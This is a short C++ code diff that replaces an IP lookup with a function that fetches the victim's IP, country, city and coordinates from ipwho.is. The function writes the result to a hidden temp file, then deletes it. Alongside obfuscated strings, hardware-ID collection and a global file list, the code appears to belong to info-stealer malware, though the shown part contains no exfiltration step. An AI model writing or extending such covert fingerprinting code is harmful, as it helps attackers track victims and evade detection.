@@ -1,6 +1,7 @@
 #include "headers.h"
 
 using namespace std;
+using Json = nlohmann::json;
 
 vector<string> globalAllFiles;
 mutex allFilesMutex;
@@ -208,15 +209,19 @@ string getHWID() {
     return string(ws.begin(), ws.end());
 }
 
-string getIP() {
-    string result;
-    URLDownloadToFileA(NULL, skCrypt("https://api.my-ip.io/ip.txt"), (TEMPFILE).c_str(), 0, NULL);
+string getIPData() {
+    string json, result;
+    URLDownloadToFileA(NULL, skCrypt("http://ipwho.is/"), (TEMPFILE).c_str(), 0, NULL);
     SetFileAttributesA((TEMPFILE).c_str(), FILE_ATTRIBUTE_HIDDEN);
     ifstream file((TEMPFILE));
-    if (!file.eof())
-        getline(file, result, '\0');
+    Json data = Json::parse(file);
     file.close();
     DeleteFileA((TEMPFILE).c_str());
+    result += (string)data[(string)skCrypt("ip")] + (string)skCrypt("\n");
+    result += (string)data[(string)skCrypt("country")] + (string)skCrypt("\n");
+    result += (string)data[(string)skCrypt("city")] + (string)skCrypt("\n");
+    result += (string)data[(string)skCrypt("latitude")] + (string)skCrypt("\n");
+    result += (string)data[(string)skCrypt("longitude")] + (string)skCrypt("\n");
     return result;
 }
 
